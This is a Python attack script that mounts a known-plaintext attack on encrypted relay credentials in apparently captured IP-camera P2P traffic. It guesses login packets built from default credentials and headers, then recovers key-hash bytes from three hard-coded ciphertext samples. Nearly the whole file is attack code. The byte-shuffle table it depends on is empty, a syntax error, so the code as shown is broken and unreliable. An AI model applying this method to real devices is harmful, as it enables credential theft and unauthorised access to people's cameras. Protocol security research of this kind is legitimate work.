#!/usr/bin/env python3
"""
Known-plaintext attack on relay credential encryption - RELAXED matching.
Show top candidates regardless of conflict count.
"""

SHUFFLE = bytes([
    ,
])

SHUFFLE_INVERSE = [0] * 256
for i, v in enumerate(SHUFFLE):
    SHUFFLE_INVERSE[v] = i

SESSIONS = {
    'capture1_a6e7_pkt0': bytes.fromhex('7638b996d6c23f9db9f64082cbcdad0002fd488e2c244d95629f2c53689dbbf12a4ec8e8ec1efe8445bb12b14c94252f1a5838b42e37049f7d1a2a95beb55ba443a8f7db93adee6a3c34e0ee70b27a744d2aee26332fc2425a0dc9893445b017'),
    'capture2_a6e7_pkt0': bytes.fromhex('b945b2c55fbe2e3215d8de3ef75cebcdf9bc35f59e0e439b95e516a49078e0cc2364d5787ea32135744e66140412f8d57478122fddd02c2a72a489ff37b3e51e1a6a9b9e4241eadf3573e0af02dc5e64f5d22131a060964bdd00a89b8a80be15'),
    'capture3_90d1_pkt0': bytes.fromhex('e96af35378d8ed637cef04a2e9783598f0acd4ac0d2792da259773ef93551495102c849648b78f70176c67d68dd8e74e27228b6de7ccaea89adf1539df18a9e4989f26a36a2b79dbc1a1540eb8260644cb7565a97b4168b028785c17d47dbdd9'),
}

def derive_hash(enc, plain_prefix):
    h = [None, None, None, None]
    prev = 0
    consistent = 0
    conflicts = 0
    
    for i in range(min(len(enc), len(plain_prefix))):
        key_byte = enc[i] ^ plain_prefix[i]
        idx = SHUFFLE_INVERSE[key_byte]
        if idx < 0:
            conflicts += 1
            prev = enc[i]
            continue
        slot = prev & 3
        derived = (idx - prev) & 0xFF
        
        if h[slot] is None:
            h[slot] = derived
            consistent += 1
        elif h[slot] == derived:
            consistent += 1
        else:
            conflicts += 1
        
        prev = enc[i]
    
    return h, consistent, conflicts

# Generate plaintexts
def make_plaintexts():
    results = []
    
    json1 = b'{"pro":"check_user","cmd":100,"devmac":"0000","user":"admin","pwd":"1234"}'
    results.append(("json_check_user_null", json1 + b'\x00' * (96 - len(json1))))
    results.append(("json_check_user_space", json1 + b' ' * (96 - len(json1))))
    
    shix_hdr = bytes([0x06,0x0a,0xa0,0x80]) + len(json1).to_bytes(4, 'little')
    p = shix_hdr + json1
    results.append(("shix_check_user_null", p + b'\x00' * (96 - len(p))))
    results.append(("shix_check_user_space", p + b' ' * (96 - len(p))))
    
    for idx in range(4):
        pppp_hdr = bytes([0xf1, 0xd0]) + (len(json1) + 4).to_bytes(2, 'big') + bytes([0xf1, 0x00, idx]) + idx.to_bytes(2, 'big')
        p = pppp_hdr + shix_hdr + json1
        results.append((f"pppp_drw_shix_idx{idx}_null", p + b'\x00' * (96 - len(p))))
        p = pppp_hdr + json1
        results.append((f"pppp_drw_raw_idx{idx}_null", p + b'\x00' * (96 - len(p))))
    
    results.append(("pad16_json", b'\x00' * 16 + json1 + b'\x00' * (96 - 16 - len(json1))))
    results.append(("pad32_json", b'\x00' * 32 + json1 + b'\x00' * (96 - 32 - len(json1))))
    results.append(("pad8_json", b'\x00' * 8 + json1 + b'\x00' * (96 - 8 - len(json1))))
    
    for fmt in [
        b'{"connectType":2,"user":"admin","pwd":"1234"}',
        b'{"connectType":"relay","user":"admin","password":"1234"}',
        b'{"connectType":"relay","protocol":"shix","user":"admin","password":"1234"}',
        b'{"type":"connect","user":"admin","pwd":"1234"}',
    ]:
        name = fmt.decode().replace('"','').replace(':','_').replace(',','_')[:40]
        results.append((name + "_null", fmt + b'\x00' * (96 - len(fmt))))
        results.append((name + "_space", fmt + b' ' * (96 - len(fmt))))
    
    return results

plaintexts = make_plaintexts()

for session_name, enc in SESSIONS.items():
    print(f"\n=== {session_name} ===")
    best = []
    for name, plain in plaintexts:
        h, consistent, conflicts = derive_hash(enc, plain)
        if consistent >= 5:
            best.append((consistent, -conflicts, name, h))
    
    best.sort(reverse=True)
    for consistent, neg_conflicts, name, h in best[:10]:
        print(f"  {name}: hash={h}, consistent={consistent}, conflicts={-neg_conflicts}")
